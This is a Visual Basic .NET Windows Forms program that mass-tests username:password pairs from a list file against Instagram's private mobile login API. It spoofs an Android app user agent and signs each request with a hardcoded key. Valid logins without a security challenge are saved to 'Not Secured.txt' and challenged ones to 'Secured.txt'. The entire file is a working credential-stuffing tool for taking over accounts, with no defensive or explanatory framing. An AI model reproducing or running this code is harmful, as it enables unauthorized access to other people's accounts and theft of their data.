Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Threading

Public Class Form1

    Private isMouseDown As Boolean = False
    Private mouseOffset As Point
    Dim secured As Integer = 0
    Dim notSecured As Integer = 0
    Dim other As Integer = 0
    Dim done As Integer = 0
    Dim list() As String

    Dim s As New ListBox
    Dim Ns As New ListBox
    Dim e As New ListBox





    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Me.Close()
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        End
    End Sub

    Private Sub me_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
        If isMouseDown Then
            Dim mousePos As Point = Control.MousePosition
            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
            Me.Location = mousePos
        End If
    End Sub

    Private Sub me_MouseUp(sender As Object, e As MouseEventArgs) Handles Me.MouseUp
        If e.Button = Windows.Forms.MouseButtons.Left Then
            isMouseDown = False
        End If
    End Sub
    Private Sub me_MouseDown(sender As Object, e As MouseEventArgs) Handles Me.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            mouseOffset = New Point(-e.X, -e.Y)
            isMouseDown = True
        End If



    End Sub

    Private Sub Label1_MouseMove(sender As Object, e As MouseEventArgs) Handles Label1.MouseMove
        If isMouseDown Then
            Dim mousePos As Point = Control.MousePosition
            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
            Me.Location = mousePos

        End If
    End Sub

    Private Sub Label1_MouseUp(sender As Object, e As MouseEventArgs) Handles Label1.MouseUp
        If e.Button = Windows.Forms.MouseButtons.Left Then
            isMouseDown = False
        End If
    End Sub
    Private Sub Label1_MouseDown(sender As Object, e As MouseEventArgs) Handles Label1.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            mouseOffset = New Point(-e.X, -e.Y)
            isMouseDown = True
        End If

    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            TextBox4.Text = notSecured
            TextBox1.Text = secured
            TextBox2.Text = other

            ProgressBar1.Value = done
        Catch ex As Exception
            Timer1.Start()
        End Try

    End Sub

    Function ran() As String
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Static r As New Random
        Dim chactersInString As Integer = r.Next(7, 8)
        Dim sb As New StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

  
    Private Sub check(user As String, pass As String)
        Try
            ServicePointManager.DefaultConnectionLimit = 300
            ServicePointManager.UseNagleAlgorithm = False
            ServicePointManager.Expect100Continue = False
            ServicePointManager.CheckCertificateRevocationList = False
            Dim request As HttpWebRequest = HttpWebRequest.Create("https://i.instagram.com/api/v1/accounts/login/")
            request.CookieContainer = New CookieContainer
            request.Method = "POST"
            request.Accept = "*/*"
            '  request.Proxy = Nothing
            request.Headers.Add("X-IG-Connection-Type", "WiFi")
            request.Headers.Add("Accept-Language", "ar-SA;q=1, en-SA;q=0.9")
            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
            request.UserAgent = "Instagram 10.3.2 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
            request.Headers.Add("X-IG-Capabilities: 3wI=")
            Dim data As String = "{""username"":""" & user & """,""password"":""" & pass & """,""_csrftoken"":""" & ran() & """,""device_id"":""" & Guid.NewGuid.ToString.ToUpper & """,""login_attempt_count"":""0""}"
            Dim sb As New StringBuilder
            Try
                Dim secretkey As String = "5ad7d6f013666cc93c88fc8af940348bd067b68f0dce3c85122a923f4f74b251"
                Dim sha As New System.Security.Cryptography.HMACSHA256(System.Text.ASCIIEncoding.ASCII.GetBytes(secretkey))
                Dim Hash() As Byte = sha.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(data))
                sb = New StringBuilder(Hash.Length * 2)
                For Each B As Byte In Hash
                    sb.Append(Hex(B).PadLeft(2, "0"))
                Next
            Catch ex As Exception : End Try
            Dim postData As String = "ig_sig_key_version=4&signed_body=" & sb.ToString.ToLower & "." & Web.HttpUtility.UrlEncode(data)
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As HttpWebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()

            reader.Close()
            dataStream.Close()
            response.Close()

            notSecured += 1
            Ns.Items.Add(user & ":" & pass)
          
           

        Catch ex As WebException
            Dim response As WebResponse = ex.Response
            Dim statusCode As HttpStatusCode
            Dim ResponseText As String
            Dim httpResponse As HttpWebResponse = CType(response, HttpWebResponse)
            statusCode = httpResponse.StatusCode
            Dim myStreamReader As New StreamReader(response.GetResponseStream())
            Using (myStreamReader)
                ResponseText = myStreamReader.ReadToEnd
            End Using

            If ResponseText.Contains("challenge") = True Then
                secured += 1
                s.Items.Add(user & ":" & pass)


            Else
                other += 1
                e.Items.Add(user & ":" & pass)

               

            End If



        End Try

        done += 1
    End Sub

    Private Sub go(ByVal up)
        up = Split(up, ":")
        check(up(0), up(1))
    End Sub
    Private Sub work()
        Try
            For i As Integer = 0 To list.Count - 1
                Dim th As New Thread(AddressOf go) : th.Start(list(i))
                Thread.Sleep(150)
            Next

            Try
                Dim s As New IO.StreamWriter("Not Secured.txt", True)
                For i = 0 To Ns.Items.Count - 1
                    s.WriteLine(Ns.Items.Item(i))
                Next
                s.Close()
            Catch ex As Exception : End Try

            Try
                Dim sv As New IO.StreamWriter("Secured.txt", True)
                For i = 0 To s.Items.Count - 1
                    sv.WriteLine(s.Items.Item(i))
                Next
                sv.Close()
            Catch ex As Exception : End Try

            Try
                Dim s As New IO.StreamWriter("Else.txt", True)
                For i = 0 To e.Items.Count - 1
                    s.WriteLine(e.Items.Item(i))
                Next
                s.Close()
            Catch ex As Exception : End Try

        Catch ex As Exception
            Thread.Sleep(500)
            work()
        End Try
    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try
            list = IO.File.ReadAllLines("list.txt")
        Catch ex As Exception
            MsgBox("list.txt" & vbCrLf & "missing", MsgBoxStyle.Critical)
            Me.Close()
        End Try

        ProgressBar1.Maximum = list.Count


    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Dim th As New Thread(AddressOf work) : th.Start()
    End Sub

 
End Class
